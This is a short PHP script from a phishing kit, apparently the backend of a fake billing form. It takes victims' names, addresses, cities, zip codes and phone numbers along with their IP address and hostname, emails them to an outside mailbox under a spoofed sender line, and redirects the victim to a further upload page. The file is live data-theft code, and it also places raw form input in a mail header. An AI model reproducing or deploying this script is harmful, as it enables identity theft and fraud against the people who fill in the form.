<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Full name                   : ".$_POST['name']."\n";
$bilsmg .= "|Address-----: ".$_POST['address1']."<br>\n";
$bilsmg .= "|State-----: ".$_POST['state']."<br>\n";
$bilsmg .= "|City-----: ".$_POST['city']."<br>\n";
$bilsmg .= "|Zip/Postal-----: ".$_POST['zip']."<br>\n";
$bilsmg .= "|Phone Number-----: ".$_POST['phone']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "jahanamcafe@mailfence.com";
$bilsub = "Pepek.com | From $ip";
$bilhead = "From:Pepek Address <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../upload.html";
header("location:$src");
?>